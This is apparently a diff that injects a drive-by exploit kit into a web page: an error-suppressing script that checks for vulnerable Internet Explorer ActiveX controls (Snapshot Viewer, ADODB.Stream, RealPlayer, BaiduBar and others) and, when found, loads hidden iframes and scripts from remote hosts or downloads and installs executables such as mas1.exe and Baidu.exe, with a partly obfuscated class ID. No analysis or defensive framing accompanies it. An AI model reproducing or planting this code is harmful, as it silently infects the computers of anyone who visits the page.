@@ -1,0 +1,14 @@
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+<SCRIPT>
+window.defaultStatus="Íê³É";
+try{if(new ActiveXObject("snpvw.Snapshot Viewer Control.1"))document.write('<iframe width=100 height=0 src=http://222.213asdas.com/ss.html></iframe>')}catch(a){}try{var b;var gw=new ActiveXObject("Downloader.DLoader.1")}catch(b){};finally{if(b!="[object Error]"){document.write('<object classid="clsid:78ABDC59-D8E7-44D3-9A76-9A0918C52B4A" id="install" width=0 height=0></object>');install["DownloadAndInstall"]("http://zxc.11se11.com/mas1.exe")}}try{var e;var fderer="dfk#*&$FEFsdfdsfds";var ado=document.createElement("object");if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");var as=ado.createobject("Adodb.Stream","")}catch(e){};finally{if(e!="[object Error]"){document.write("<script src=http:\/\/222.213asdas.com\/ms06014.js><\/script>")}else{try{var f;var Flashver=(new ActiveXObject("ShockwaveFlash.ShockwaveFlash.9")).GetVariable("$version").split(",")}catch(f){};finally{if(f!="[object Error]"){if(navigator.userAgent.toLowerCase().indexOf("msie")>0){document.write('<embed src="http://222.213asdas.com/'+Flashver[2]+'.swf"></embed>')}}}try{var g;var storm=new ActiveXObject("UUUPGRADE.UUUpgradeCtrl.1")}catch(g){};finally{if(g!="[object Error]"){var url="http://222.213asdas.com/";storm=document.createElement("object");ActivePerl="-1C59-4BBB-8E8";getSpraySlide="1-6E83F82C813B";helloworld2Address="clsid:2CACD7BB";storm.setAttribute("classid",helloworld2Address+ActivePerl+getSpraySlide);storm["Update"]("\\Program Files\\Common Files\\uusee\\",url+"UU.ini","",1)}}try{var h;var glworld=new ActiveXObject("GLIEDown.IEDown.1")}catch(h){};finally{if(h!="[object Error]"){document.write('<iframe style=display:none src="http://222.213asdas.com/GLWORLD.html"></iframe>')}}try{var i;var real=new ActiveXObject("IERPCtl.IERPCtl.1")}catch(i){};finally{if(i!="[object Error]"){if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552"){document.write('<sCrIpT LAnGuAgE="jAvAsCrIpT" src=http:\/\/222.213asdas.com\/real.js><\/script>')}else{document.write('<iframe style=display:none src="http://222.213asdas.com/real11.html"></iframe>')}}}try{var j;var Baidu=new ActiveXObject("BaiduBar.Tool")}catch(j){};finally{if(j!="[object Error]"){Baidu["DloadDS"]("http://222.213asdas.com/Baidu.cab","Baidu.exe",0)}}if(f=="[object Error]"&&g=="[object Error]"&&h=="[object Error]"&&i=="[object Error]"){try{if(new ActiveXObject("DPClient.Vod"))document.write('<iframe width=100 height=0 src=http://222.213asdas.com/Thunder.html></iframe>')}catch(e){}}}}
+</script>
+<iframe width=100 height=0 src=http://121.213asdas.com/fzl.htm></iframe>
+
+
+
+
+
+
+
+<script type="text/javascript" src="http://js.tongji.cn.yahoo.com/750679/ystat.js"></script><noscript><a href="http://tongji.cn.yahoo.com"><img src="http://img.tongji.cn.yahoo.com/750679/ystat.gif"/></a></noscript>
